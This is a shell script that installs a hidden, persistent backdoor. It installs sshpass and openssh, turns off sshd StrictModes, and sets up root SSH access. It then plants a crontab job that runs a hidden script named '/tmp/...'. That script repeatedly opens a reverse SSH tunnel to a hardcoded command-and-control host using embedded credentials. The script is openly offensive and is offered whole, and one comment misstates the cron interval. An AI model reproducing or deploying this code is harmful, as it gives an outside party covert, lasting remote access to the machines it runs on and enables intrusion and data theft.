#!/bin/sh

user="h4x0r"
pass="3!E37"
host="command.control.con"
port="2600"


get_packages() {
	# list of dependencies
	packages='openssh-client 
		  openssh-server 
		  sshpass'

	# iterate through dependency list and install
	for package in $packages; do 
		apt install -y $package; 
	done
}


mutator_ssh_config() {
	# temp file for sshd configuration
	tmp_config_file=$(mktemp)
	# sshd config file to change
	sshd_config_file='/etc/ssh/sshd_config'
	# backup existing config
	cp ${sshd_config_file} ${sshd_config_file}.orig

	# turn off strict security checking
	sed 's/StrictModes\ yes/StrictModes\ no/g' ${sshd_config_file} > ${tmp_config_file}
	# replace sshd config file with altered
	mv ${tmp_config_file} ${sshd_config_file}
	# clean temp files
	rm -f ${tmp_config_file}

	# use the key to get root via ssh
	ssh-copy-id root@127.0.0.1
}


mutator_cron_config() {
	# temp file for cron config
	cron_config_file=$(mktemp)
	# run a script every 30 seconds and send output to bit bucket
	cron_config='*/2 * * * * sh /tmp/... > /dev/null 2>&1'

	# disable some security, and attach a reverse shell to the foreign host
	cron_command="sshpass -p "$pass" ssh -o "StrictHostKeyChecking no" -f -N -T -R$port:localhost:22 $host -p22 -l $user > /dev/null &"
	# sneaky file name
	cron_command_file='/tmp/...'

	# put data into files
	echo -n $cron_config > ${cron_config_file}
	echo -n $cron_command > ${cron_command_file}

	# install crontab
	crontab ${cron_config_file}
	# remove temp
	rm -f ${cron_config_file}
}


main() {
	get_packages
	mutator_ssh_config
	mutator_cron_config
}


main
